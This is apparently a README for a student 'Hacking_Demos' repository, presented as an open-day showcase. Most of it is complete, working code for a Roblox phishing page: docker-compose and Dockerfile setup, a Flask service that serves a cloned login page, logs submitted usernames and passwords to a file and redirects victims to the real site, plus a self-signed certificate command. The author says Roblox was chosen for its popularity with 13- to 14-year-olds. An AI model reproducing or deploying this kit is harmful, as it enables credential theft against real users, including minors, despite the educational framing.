# Hacking_Demos

> [!NOTE]
> This repository contains hacking/exploit examples like phishing to act as showcase for open door day in my college. <br/>

> [!NOTE]
> **Phishing** <br/>
> In the phishing example, I opted to utilize the online gaming platform 'Roblox' due to its popularity among the 13- to 14-year-old age demographic, making it a fitting choice.

## Phishing

To set this all up I created a small containerized application using `docker-compose`. <br/>
```yml
version: '3.9'

services:
  web:
    build: .
    restart: always
    ports:
      - "80:5000"
    volumes:
      - ./output:/output
```

In this `docker-compose.yml` file I mapped the Flask service running on Port `5000` to the exposed Port `80`. <br/>
I added a volume for the purpose of storing credentials during the demonstration, the output directory contains the credentials of victims. <br/>

The Dockerfile sets up the latest python environment and starts the `service.py` script. <br/>
```docker
FROM python:latest

WORKDIR /app

COPY . /app

RUN pip install --no-cache-dir -r requirements.txt

EXPOSE 5000

CMD ["python3", "service.py"]
```

The `service.py` script just launches a normal `Flask` service which provides the landing page and a redirect after successfully obtaining a victims credentials. <br/>
```py
from flask import *
import ssl

app = Flask(__name__)

# API Endpoint for Index-Page
@app.route("/", methods=['GET', 'POST'])
def index():
    if request.method == 'GET':
        return render_template('roblox.html')
    if request.method == 'POST':
        return render_template('roblox.html')

# API Endpoint for styling files
@app.route('/roblox_files/<path:filename>')
def serve_roblox_file(filename):
    return send_from_directory('/app/roblox_files/', filename)

# API Endpoint to store creds and redirect user
@app.route('/api/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    with open('/output/output.txt', 'a') as file:
        file.write(f'------------------------------------\n\nUsername: {username}\nPassword: {password}\n\n')

    return redirect('https://www.roblox.com/login')

# Generation of ssl cert
def generate_ssl_context():
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    ssl_context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
    return ssl_context

if __name__ == '__main__':
    ssl_context = generate_ssl_context()
    app.run(host="0.0.0.0", port=443, ssl_context=ssl_context)
```

I will not comment on the `html` and `css` files from roblox as they are just a simple replica of `roblox.com` and I have no rights whatsoever to reuse the actual source. (Please don't sue me.)

At last I generated a `self-signed` SSL certificate using openssl which is than being used by `service.py`. <br/>
```
openssl req -x509 -nodes -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -subj "/CN=localhost"
```